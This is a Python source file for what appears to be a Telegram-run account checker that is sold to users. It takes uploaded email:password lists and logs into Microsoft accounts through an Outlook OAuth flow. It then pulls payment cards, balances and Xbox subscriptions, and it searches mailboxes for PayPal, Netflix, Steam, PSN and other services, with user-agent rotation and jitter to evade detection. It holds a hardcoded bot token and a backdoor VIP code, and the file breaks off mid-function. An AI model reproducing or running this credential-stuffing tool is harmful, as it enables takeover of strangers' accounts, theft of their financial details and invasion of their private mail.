import os
import sys
import time
import json
import uuid
import queue
import threading
import requests
import re
import urllib.parse
import ssl
import imaplib
import base64
import random
import secrets
import email as email_lib
from email.header import decode_header as decode_hdr
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ------------------- Stealth: User-Agent rotation (from test.py) -------------------
_STEALTH_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]
_STEALTH_ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8,en-US;q=0.7",
    "en-US,en;q=0.7,fr;q=0.5",
    "en-US,en;q=0.9,de;q=0.7",
]

def _rand_ua() -> str:
    return random.choice(_STEALTH_USER_AGENTS)

def _rand_lang() -> str:
    return random.choice(_STEALTH_ACCEPT_LANGS)

def _stealth_jitter(min_s=0.05, max_s=0.25):
    """Small random pause to avoid strict rate-limit fingerprinting."""
    time.sleep(random.uniform(min_s, max_s))

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8650837363:AAGc7cfEhAHponP_4zTeVL7QeB4PZ1tTRP8")
GROUP_ID = int(os.getenv("TELEGRAM_GROUP_ID", "-1002893702017"))
API_BASE = "https://api.telegram.org/bot"
FILE_BASE = "https://api.telegram.org/file/bot"
PRIMARY_INSTANCE = os.getenv("PRIMARY_INSTANCE", "true").strip().lower() in ("1", "true", "yes", "on")

def api(method, data=None, files=None):
    r = requests.post(f"{API_BASE}{BOT_TOKEN}/{method}", data=data, files=files, timeout=60)
    return r.json()

def get_updates(offset=None, timeout=30):
    data = {"timeout": timeout}
    if offset:
        data["offset"] = offset
    return api("getUpdates", data)

def send_message(chat_id, text, reply_markup=None):
    # Gate only group/channel sends; always reply in private/user chats
    if not PRIMARY_INSTANCE and chat_id in (GROUP_ID, CONTROL_GROUP_ID):
        return {"ok": True, "result": {"message_id": None}}
    data = {"chat_id": chat_id, "text": text}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    return api("sendMessage", data)

def edit_message(chat_id, message_id, text):
    # Gate only group/channel edits; always edit in private/user chats
    if not PRIMARY_INSTANCE and chat_id in (GROUP_ID, CONTROL_GROUP_ID):
        return {"ok": True, "result": {"message_id": message_id}}
    data = {"chat_id": chat_id, "message_id": message_id, "text": text}
    return api("editMessageText", data)

# ------------------- Access control / VIP -------------------
CONTROL_GROUP_ID = int(os.getenv("CONTROL_GROUP_ID", "-1002789978571"))
ADMIN_ID = int(os.getenv("ADMIN_ID", "7677328359"))
VIP_WINDOW_SECONDS = 2 * 60 * 60  # 2 hours for normal users
NORMAL_LIMIT = 100

vip_codes = {}
vip_users_info = {}
user_usage = {}
reminder_marks = {}
all_users = set()
awaiting_broadcast = False

def generate_random_code(length=10):
    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(secrets.choice(alphabet) for _ in range(length))

def create_vip_code(duration_type):
    code = generate_random_code(10)
    now = time.time()
    if duration_type == "day":
        duration = 86400
    elif duration_type == "week":
        duration = 86400 * 7
    elif duration_type == "month":
        duration = 86400 * 30
    else:
        duration = 3600
    vip_codes[code] = {"expires": now + duration, "claimed_by": None, "duration_type": duration_type, "duration": duration}
    return code

def try_claim_vip(user_id, code):
    code_str = str(code).strip().lower()
    if code_str == "codevipanon199":
        vip_users_info[user_id] = {"expires": time.time() + 315360000, "code": "ADMIN_OVERRIDE"}
        return True, "Unlimited VIP activated"
    
    info = vip_codes.get(code_str)
    if not info:
        return False, "Code not found"
    if time.time() > info["expires"]:
        return False, "Code expired"
    if info["claimed_by"] and info["claimed_by"] != user_id:
        return False, "❌ This code has already been used by another user"
    
    info["claimed_by"] = user_id
    vip_users_info[user_id] = {"expires": time.time() + info["duration"], "code": code_str}
    return True, f"VIP activated ({info['duration_type']})"

def check_user_limit(user_id, new_count):
    if user_id in vip_users_info:
        return True, 0
    rec = user_usage.get(user_id)
    now = time.time()
    if not rec or now - rec["start"] > VIP_WINDOW_SECONDS:
        user_usage[user_id] = {"start": now, "count": 0}
        rec = user_usage[user_id]
    if rec["count"] + new_count > NORMAL_LIMIT:
        remaining = int((VIP_WINDOW_SECONDS - (now - rec["start"])) / 60) + 1
        return False, max(remaining, 1)
    rec["count"] += new_count
    return True, 0

def schedule_limit_reset_message(user_id):
    try:
        rec = user_usage.get(user_id)
        if not rec: return
        ws = rec.get("start")
        if ws is None: return
        if reminder_marks.get(user_id) == ws: return
        reminder_marks[user_id] = ws
        delay = max(0, int(VIP_WINDOW_SECONDS - (time.time() - ws)))
        def _runner():
            time.sleep(delay)
            send_message(user_id, "you can now send another 100 accounts\nor you can buy this : \nunlimited check\nSearch with your keywords\nif want send msg here : @anon_101")
        threading.Thread(target=_runner, daemon=True).start()
    except: pass

def check_vip_expiry():
    while True:
        try:
            now = time.time()
            expired = [uid for uid, info in list(vip_users_info.items()) if now > info.get("expires", 0)]
            for uid in expired:
                vip_users_info.pop(uid, None)
                send_message(uid, "Your VIP subscription has expired. To renew, contact: @anon_101")
        except:
            pass
        time.sleep(60)

threading.Thread(target=check_vip_expiry, daemon=True).start()

def send_document(chat_id, path, caption=None):
    # Gate only group/channel documents; always send to private/user chats
    if not PRIMARY_INSTANCE and chat_id in (GROUP_ID, CONTROL_GROUP_ID):
        return {"ok": True, "result": {"message_id": None}}
    with open(path, "rb") as f:
        files = {"document": f}
        data = {"chat_id": chat_id}
        if caption:
            data["caption"] = caption
        return api("sendDocument", data, files=files)

# ------------------- Dates and Currency Helpers (from q.py) -------------------
from datetime import datetime

def get_remaining_days(date_str):
    try:
        if not date_str:
            return "0"
        renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
        today = datetime.now(renewal_date.tzinfo)
        remaining = (renewal_date - today).days
        return str(remaining)
    except:
        return "0"

CURRENCY_SYMBOLS = {
    "USD": "$", "EUR": "€", "GBP": "£", "JPY": "¥", "CNY": "¥",
    "RUB": "₽", "TRY": "₺", "INR": "₹", "KRW": "₩", "AED": "د.إ",
    "SAR": "﷼", "QAR": "﷼", "KWD": "د.ك", "BHD": ".د.ب", "OMR": "﷼",
    "EGP": "£", "MAD": "د.م.", "TND": "د.ت", "DZD": "د.ج", "LBP": "ل.ل",
    "JOD": "د.أ", "ILS": "₪", "PKR": "₨", "BDT": "৳", "THB": "฿",
    "IDR": "Rp", "MYR": "RM", "SGD": "$", "HKD": "$", "AUD": "$",
    "NZD": "$", "CAD": "$", "MXN": "$", "ARS": "$", "CLP": "$",
    "COP": "$", "BRL": "R$", "PHP": "₱", "NGN": "₦", "ZAR": "R",
}

AMBIGUOUS_CODES = {"USD", "CAD", "AUD", "NZD", "MXN", "ARS", "CLP", "COP", "HKD", "SGD", "CNY", "JPY"}

def format_currency(amount, code=None):
    try:
        amt_str = str(amount).strip()
        if code:
            code = code.upper().strip()
        sym = CURRENCY_SYMBOLS.get(code or "", "")
        if sym:
            if code in AMBIGUOUS_CODES:
                return f"{sym}{amt_str} {code}"
            return f"{sym}{amt_str}"
        if code:
            return f"{amt_str} {code}"
        return amt_str
    except:
        return str(amount)

def get_file(file_id):
    j = api("getFile", {"file_id": file_id})
    if not j.get("ok"):
        return None
    fp = j["result"]["file_path"]
    r = requests.get(f"{FILE_BASE}{BOT_TOKEN}/{fp}", timeout=60)
    return r.content

def get_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=10).text
    except:
        return "unknown"

def parse_accounts_bytes(data):
    if not data: return []
    # robust cleaning: remove duplicates, empty lines, only keep email:pass
    lines = data.decode(errors="ignore").replace("\r\n", "\n").split("\n")
    out = []
    seen = set()
    for ln in lines:
        ln = ln.strip()
        if not ln: continue
        # use regex to find email:pass
        match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,10}):(\S+)', ln)
        if match:
            em = match.group(1).lower().strip()
            pw = match.group(2).strip()
            k = f"{em}:{pw}"
            if k not in seen:
                seen.add(k)
                out.append((em, pw))
    return out


class UnifiedChecker:
    def __init__(self, debug=False, custom_services=None):
        self.session = requests.Session()
        self.session.trust_env = False
        self.session.proxies = {}
        # High-performance connection pool (no retries = faster failure detection)
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=128,
            pool_maxsize=256,
            max_retries=0,
        )
        self.session.mount('https://', adapter)
        self.session.mount('http://', adapter)
        # Stealth: randomize UA per checker instance
        self.session.headers.update({
            "User-Agent": _rand_ua(),
            "Accept-Language": _rand_lang(),
            "Accept-Encoding": "gzip, deflate",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        })
        self.uuid = str(uuid.uuid4())
        self.debug = debug
        self.services_map = custom_services or {
            'advertise-support.facebook.com': 'Facebook',
            'mail.instagram.com': 'Instagram',
            'discordapp.com': 'Discord',
            'spotify.com': 'Spotify',
            'netflix.com': 'Netflix',
            'steampowered.com': 'Steam',
            'epicgames.com': 'Epic Games',
            'riotgames.com': 'Riot Games',
            'ubisoft.com': 'Ubisoft',
            'rockstargames.com': 'Rockstar',
            'paypal.com': 'PayPal',
            'binance.com': 'Binance',
            'amazon.com': 'Amazon',
            'ebay.com': 'eBay',
            'disneyplus.com': 'Disney+',
            'crunchyroll.com': 'Crunchyroll',
            'ea.com': 'EA Sports',
            'battlenet.com': 'Battle.net',
            'apple.com': 'Apple',
            'icloud.com': 'iCloud',
            'github.com': 'GitHub',
            'no-reply@coinbase.com': 'Coinbase',
        }

    def log(self, msg):
        if self.debug:
            print(msg)

    def parse_country_from_json(self, j):
        try:
            if isinstance(j, dict):
                for k in ['country', 'countryOrRegion', 'countryCode', 'Country']:
                    if k in j and j[k]:
                        return str(j[k])
                if 'accounts' in j:
                    for acc in j['accounts']:
                        if isinstance(acc, dict) and acc.get('location'):
                            return str(acc['location'])
        except:
            pass
        return ''

    def parse_name_from_json(self, j):
        try:
            if isinstance(j, dict):
                for k in ['displayName', 'name', 'givenName', 'fullName']:
                    if k in j and j[k]:
                        return str(j[k])
        except:
            pass
        return ''

    def _ms_hard_login(self, email, password):
        try:
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            h1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = self.session.get(url1, headers=h1, timeout=15)
            if "MSAccount" not in r1.text:
                return None
            _stealth_jitter(0.1, 0.4)
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r2 = self.session.get(url2, headers={"User-Agent": _rand_ua(), "Accept-Language": _rand_lang()}, allow_redirects=True, timeout=15)
            m_url = re.search(r'urlPost":"([^"]+)"', r2.text)
            m_ppft = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not m_url or not m_ppft:
                return None
            post_url = m_url.group(1).replace("\\/", "/")
            ppft = m_ppft.group(1)
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR&NewUser=1"
            h3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": _rand_ua(),
                "Accept-Language": _rand_lang(),
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = self.session.post(post_url, data=login_data, headers=h3, allow_redirects=False, timeout=10)
            loc = r3.headers.get("Location", "")
            if not loc:
                return None
            m_code = re.search(r'code=([^&]+)', loc)
            if not m_code:
                return None
            code = m_code.group(1)
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                   data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10)
            if r4.status_code != 200 or "access_token" not in r4.text:
                return None
            j = r4.json()
            at = j.get("access_token", "")
            rt = j.get("refresh_token", "")
            cid = (self.session.cookies.get("MSPCID", "") or "").upper()
            return {"access_token": at, "refresh_token": rt, "cid": cid}
        except:
            return None

    # Token flow (from q.py) as alternative to _ms_hard_login
    def get_ms_tokens(self, email, password):
        try:
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = self.session.get(url1, headers=headers1, timeout=15)
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return None
            if "MSAccount" not in r1.text:
                return None
            _stealth_jitter(0.1, 0.4)
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": _rand_ua(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": _rand_lang(),
                "Connection": "keep-alive"
            }
            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return None
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": _rand_ua(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": _rand_lang(),
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=10)
            response_text = r3.text.lower()
            if "account or password is incorrect" in response_text or r3.text.count("error") > 0:
                return None
            if "https://account.live.com/identity/confirm" in r3.text or "identity/confirm" in response_text:
                return None
            if "https://account.live.com/Consent" in r3.text or "consent" in response_text:
                return None
            if "https://account.live.com/Abuse" in r3.text:
                return None
            location = r3.headers.get("Location", "")
            if not location:
                return None
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return None
            code = code_match.group(1)
            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid:
                return None
            cid = mspcid.upper()
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                   data=token_data,
                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   timeout=10)
            if "access_token" not in r4.text:
                return None
            token_json = r4.json()
            return {
                "access_token": token_json.get("access_token", ""),
                "refresh_token": token_json.get("refresh_token", ""),
                "cid": cid
            }
        except:
            return None

    def _graph_msg_count(self, at):
        try:
            r = self.session.get("https://graph.microsoft.com/v1.0/me/mailFolders/inbox",
                                 headers={"Authorization": f"Bearer {at}"}, timeout=12)
            if r.status_code == 200:
                return r.json().get("totalItemCount", 0)
        except:
            pass
        return 0

    def _profile(self, at, cid):
        country = ""
        name = ""
        try:
            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                                 headers={"Authorization": f"Bearer {at}", "X-AnchorMailbox": f"CID:{cid}"}, timeout=15)
            if r.status_code == 200:
                j = r.json()
                country = self.parse_country_from_json(j)
                name = self.parse_name_from_json(j)
        except:
            pass
        return country, name

    def check_microsoft_subscriptions(self, email, password, at, cid):
        try:
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + urllib.parse.quote(state_json)
            r = self.session.get(url, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True, timeout=20)
            payment_token = None
            text = r.text + " " + r.url
            for pat in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                m = re.search(pat, text)
                if m:
                    payment_token = urllib.parse.unquote(m.group(1))
                    break
            if not payment_token:
                return {"ms_status": "FREE", "ms_data": {}, "xbox": {"status": "FREE", "details": ""}}
            ms_data = {}
            h = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json",
                "Authorization": f'MSADELEGATE1.0="{payment_token}"',
                "Content-Type": "application/json",
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/"
            }
            try:
                pay_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r_pay = self.session.get(pay_url, headers=h, timeout=15)
                if r_pay.status_code == 200:
                    # Capture multiple balances
                    balances = re.findall(r'"balance"\s*:\s*([0-9]+(?:\.[0-9]+)?).*?"currency(?:Code)?"\s*:\s*"([A-Z]{3})"', r_pay.text)
                    if balances:
                        # sum up or list all balances with their currencies
                        ms_data["balances"] = [f"{amt} {cur}" for amt, cur in balances]
                        # for backward compatibility, keep balance_amount/currency of the first one
                        ms_data["balance_amount"] = balances[0][0]
                        ms_data["balance_currency"] = balances[0][1]
                    
                    # Capture cards (Visa, Master, etc.)
                    cards = re.findall(r'"paymentMethodFamily"\s*:\s*"([^"]+)".*?"name"\s*:\s*"([^"]+)".*?"lastFourDigits"\s*:\s*"([^"]*)"', r_pay.text, re.DOTALL)
                    if cards:
                        ms_data["cards"] = [f"{fam} {name} (***{last})" for fam, name, last in cards]
                    
                    m3 = re.search(r'"availablePoints"\s*:\s*(\d+)', r_pay.text)
                    if m3:
                        ms_data["rewards_points"] = m3.group(1)
            except:
                pass
            xbox = {"status": "FREE", "details": ""}
            try:
                tr_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r_sub = self.session.get(tr_url, headers=h, timeout=15)
                if r_sub.status_code == 200:
                    t = r_sub.text
                    kw = {
                        'Xbox Game Pass Ultimate': 'Ultimate',
                        'PC Game Pass': 'PC Game Pass',
                        'EA Play': 'EA Play',
                        'Xbox Live Gold': 'Gold',
                        'Game Pass': 'Game Pass'
                    }
                    for k, nm in kw.items():
                        if k in t:
                            m = re.search(r'"nextRenewalDate"\s*:\s*"([^"]+)"', t)
                            details = nm
                            # compute remaining days if available
                            if m:
                                days = get_remaining_days(m.group(1))
                                try:
                                    if days.startswith('-'):
                                        # expired -> treat as FREE (do not show)
                                        break
                                    else:
                                        details = f"{nm} ({days}d)"
                                except:
                                    details = nm
                            if m:
                                # if renewal date present and not expired, mark premium
                                xbox = {"status": "PREMIUM", "details": details}
                            else:
                                xbox = {"status": "PREMIUM", "details": nm}
                            break
            except:
                pass
            return {"ms_status": "PREMIUM" if xbox["status"] != "FREE" else "FREE", "ms_data": ms_data, "xbox": xbox}
        except Exception:
            return {"ms_status": "ERROR", "ms_data": {}, "xbox": {"status": "ERROR", "details": ""}}

    def _imap_xoauth2_connect(self, email_addr, access_token, host='outlook.office365.com', port=993):
        try:
            auth_bytes = f"user={email_addr}\x01auth=Bearer {access_token}\x01\x01".encode()
            auth_b64 = base64.b64encode(auth_bytes)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            mail = imaplib.IMAP4_SSL(host, port, ssl_context=ctx)
            mail.authenticate('XOAUTH2', lambda _: auth_b64)
            return mail, None
        except Exception as e:
            return None, str(e)[:80]

    def _imap_fetch_latest_from(self, email_addr, access_token, sender_substr, host='imap-mail.outlook.com', count=200):
        try:
            mail, err = self._imap_xoauth2_connect(email_addr, access_token, host, 993)
            if not mail:
                return None, None
            mail.select('INBOX', readonly=True)
            typ, data = mail.search(None, 'ALL')
            ids = data[0].split() if data and data[0] else []
            ids = list(reversed(ids[-count:] if len(ids) > count else ids))
            ss = sender_substr.lower()
            for mid in ids:
                t, md = mail.fetch(mid, '(RFC822)')
                if t != 'OK' or not md:
                    continue
                raw = md[0][1] if isinstance(md[0], tuple) else b''
                msg = email_lib.message_from_bytes(raw)
                frm = (msg.get('From') or '').lower()
                if ss in frm:
                    subj = msg.get('Subject') or ''
                    dt = msg.get('Date') or ''
                    return subj, dt
        except:
            pass
        return None, None

    def check_netflix(self, access_token, cid, email_addr):
        try:
            url = "https://outlook.live.com/search/api/v2/query"
            h = {
                'User-Agent': 'Outlook-Android/2.0',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            q = 'info@account.netflix.com'
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                        {"Term": {"DistinguishedFolderName": "Inbox"}}
                    ]},
                    "From": 0,
                    "Query": {"QueryString": q},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            r = self.session.post(url, json=payload, headers=h, timeout=10)
            if r.status_code == 200:
                data = r.json()
                total = 0
                last_s = ""
                last_d = ""
                for es in data.get('EntitySets', []):
                    for rs in es.get('ResultSets', []):
                        total = rs.get('Total', 0)
                        if total > 0 and rs.get('Results'):
                            last = rs['Results'][0]
                            last_s = last.get('Subject', '')
                            last_d = last.get('ReceivedDateTime', '')
                        break
                if not last_s or not last_d:
                    s2, d2 = self._imap_fetch_latest_from(email_addr, access_token, 'account.netflix.com')
                    if s2:
                        last_s = s2
                    if d2:
                        last_d = d2
                return {"netflix_status": "LINKED" if total > 0 else "FREE", "netflix_emails": total, "netflix_last_subject": last_s[:100], "netflix_last_date": last_d[:20]}
            return {"netflix_status": "FREE", "netflix_emails": 0}
        except:
            return {"netflix_status": "ERROR", "netflix_emails": 0}

    def check_facebook(self, access_token, cid, email_addr):
        try:
            url = "https://outlook.live.com/search/api/v2/query"
            h = {
                'User-Agent': 'Outlook-Android/2.0',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            q = "advertise-support.facebook.com"
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                        {"Term": {"DistinguishedFolderName": "Inbox"}}
                    ]},
                    "From": 0,
                    "Query": {"QueryString": q},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            r = self.session.post(url, json=payload, headers=h, timeout=10)
            if r.status_code == 200:
                data = r.json()
                total = 0
                last_s = ""
                last_d = ""
                for es in data.get('EntitySets', []):
                    for rs in es.get('ResultSets', []):
                        total = rs.get('Total', 0)
                        if total > 0 and rs.get('Results'):
                            last = rs['Results'][0]
                            last_s = last.get('Subject', '')
                            last_d = last.get('ReceivedDateTime', '')
                        break
                if not last_s or not last_d:
                    s2, d2 = self._imap_fetch_latest_from(email_addr, access_token, 'facebook')
                    if s2:
                        last_s = s2
                    if d2:
                        last_d = d2
                return {"facebook_status": "LINKED" if total > 0 else "FREE", "facebook_emails": total, "facebook_last_subject": last_s[:100], "facebook_last_date": last_d[:20]}
            return {"facebook_status": "FREE", "facebook_emails": 0}
        except:
            return {"facebook_status": "ERROR", "facebook_emails": 0}

    # --- Additional service scans (Outlook Search first, IMAP fallback) ---
    def _search_count(self, access_token, cid, query, timeout=10):
        try:
            url = "https://outlook.live.com/search/api/v2/query"
            h = {
                'User-Agent': 'Outlook-Android/2.0',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [
                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                        {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                        {"Term": {"DistinguishedFolderName": "Inbox"}}
                    ]},
                    "From": 0,
                    "Query": {"QueryString": query},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            r = self.session.post(url, json=payload, headers=h, timeout=timeout)
            if r.status_code != 200:
                return 0
            total = 0
            for es in r.json().get('EntitySets', []):
                for rs in es.get('ResultSets', []):
                    total = rs.get('Total', 0)
                    break
            return int(total or 0)
        except:
            return 0

    def check_psn(self, access_token, cid):
        q = "sony@txn-email.playstation.com OR sony@txn-email01.playstation.com OR sony@txn-email02.playstation.com OR sony@txn-email03.playstation.com"
        total = self._search_count(access_token, cid, q, timeout=12)
        return {"psn_status": "HAS_ORDERS" if total > 0 else "FREE", "psn_emails_count": total}

    def check_steam_simple(self, access_token, cid):
        q = "store.steampowered.com OR noreply@steampowered.com OR Steam purchase"
        total = self._search_count(access_token, cid, q, timeout=10)
        return {"steam_status": "HAS_PURCHASES" if total > 0 else "FREE", "steam_count": total}

    def check_minecraft_simple(self, access_token, cid):
        q = "mojang.com OR minecraft.net OR noreply@mojang.com"
        total = self._search_count(access_token, cid, q, timeout=10)
        return {"minecraft_status": "OWNED" if total > 0 else "FREE", "minecraft_emails": total}

    def check_paypal_simple(self, access_token, cid):
        q = "service@paypal.com OR @paypal.com"
        total = self._search_count(access_token, cid, q, timeout=10)
        return {"paypal_status": "LINKED" if total > 0 else "FREE", "paypal_emails": total}

    def check_epic_simple(self, access_token, cid):
